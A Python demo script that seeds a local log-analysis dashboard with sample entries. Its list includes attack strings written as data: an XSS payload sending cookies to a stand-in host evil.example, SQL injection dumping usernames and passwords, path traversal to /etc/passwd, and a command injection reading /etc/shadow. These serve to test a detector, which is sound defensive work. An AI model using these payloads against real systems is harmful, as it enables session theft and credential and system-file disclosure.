"""
seed_demo_data.py — Populates AmIDataBroke with realistic sample activity for a live demo.

IMPORTANT: This script does NOT fake any AI output. Every log below is sent
as a real HTTP request to your running backend's /analyze-log endpoint — the
ML model, categorization, MITRE tagging, and correlation logic all run for
real on this data, exactly as they would on data you type in by hand. This
script only supplies realistic INPUT text, so you don't have to type a dozen
attack strings live during a presentation.

USAGE:
    1. Make sure your backend is already running:
         uvicorn main:app --reload --port 8000
    2. In a separate terminal, run this script:
         python seed_demo_data.py
    3. Refresh your dashboard — the Log History, Correlation panel, and
       KPIs will all populate from genuinely-processed data.
"""

import requests
import time

API_BASE = "http://127.0.0.1:8000"

# A mix of realistic malicious and benign log lines, including a deliberate
# repeat-offender IP (203.0.113.77) across multiple attack types, so the
# Cross-Module Threat Correlation panel has something real to escalate.
DEMO_LOGS = [
    # Repeat offender — brute force, then SQLi, then XSS, all from the same IP
    {"payload": "Failed login attempt for user 'admin'", "source_ip": "203.0.113.77"},
    {"payload": "Failed login attempt for user 'admin'", "source_ip": "203.0.113.77"},
    {"payload": "GET /login?user=admin%27--  HTTP/1.1", "source_ip": "203.0.113.77"},
    {"payload": "<script>document.location='http://evil.example/steal?c='+document.cookie</script>", "source_ip": "203.0.113.77"},

    # One-off SQL injection from a different IP
    {"payload": "GET /products?id=1%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1", "source_ip": "198.51.100.42"},

    # Path traversal attempt
    {"payload": "GET /download?file=../../../../etc/passwd HTTP/1.1", "source_ip": "192.0.2.14"},

    # Command injection attempt
    {"payload": "GET /ping?host=8.8.8.8;cat%20/etc/shadow HTTP/1.1", "source_ip": "192.0.2.99"},

    # Benign, normal traffic
    {"payload": "2026-07-03T11:00:01Z INFO User 'jdoe' logged in successfully from 10.0.0.5", "source_ip": None},
    {"payload": "GET /dashboard HTTP/1.1 200 OK", "source_ip": None},
    {"payload": "User 'msmith' updated their profile settings", "source_ip": None},

    # A known Tor exit node hitting a login page with a benign-looking request
    # (only meaningful if you have ABUSEIPDB_API_KEY configured — will show
    # the Tor/proxy highlighting even though the payload itself looks harmless)
    {"payload": "GET /admin HTTP/1.1 200 OK", "source_ip": "185.220.101.5"},
]


def main():
    print(f"Seeding {len(DEMO_LOGS)} realistic log entries into {API_BASE} ...")
    ok, failed = 0, 0

    for i, entry in enumerate(DEMO_LOGS, start=1):
        try:
            resp = requests.post(f"{API_BASE}/analyze-log", json=entry, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                print(f"  [{i}/{len(DEMO_LOGS)}] #{data['id']} -> {data['verdict']} "
                      f"({data['category']}, {data['risk_score']}% risk)")
                ok += 1
            else:
                print(f"  [{i}/{len(DEMO_LOGS)}] FAILED: {resp.status_code} {resp.text}")
                failed += 1
        except requests.RequestException as e:
            print(f"  [{i}/{len(DEMO_LOGS)}] ERROR: could not reach backend — {e}")
            failed += 1
            break  # backend likely isn't running; no point continuing

        time.sleep(0.3)  # small delay so the dashboard's timestamps look distinct

    print(f"\nDone. {ok} succeeded, {failed} failed.")
    if ok > 0:
        print("Refresh your dashboard now — Log History, Correlation, and KPIs are all live.")


if __name__ == "__main__":
    main()
